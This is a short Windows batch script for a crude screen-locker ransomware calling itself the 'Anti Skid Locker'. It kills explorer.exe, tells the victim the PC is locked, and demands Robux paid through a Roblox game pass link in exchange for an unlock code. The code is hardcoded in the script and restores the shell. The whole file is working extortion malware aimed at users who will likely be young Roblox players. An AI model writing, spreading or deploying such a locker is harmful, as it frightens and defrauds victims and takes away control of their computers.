@echo off
taskkill /f /im explorer.exe
cls
echo Your PC has been locked by the Anti Skid Locker
echo To unlock it you need to pay robux to this games gamepass https://www.roblox.com/game-pass/1233887509/unlock-code
set code=""

:code
set /p code="Enter Code:"
if "%code%"=="8548547695478" goto correct
if NOT "%code%"=="8548547695478" goto wrong

:correct
start userinit
echo Correct Code
pause
exit

:wrong
echo Wrong Code
goto code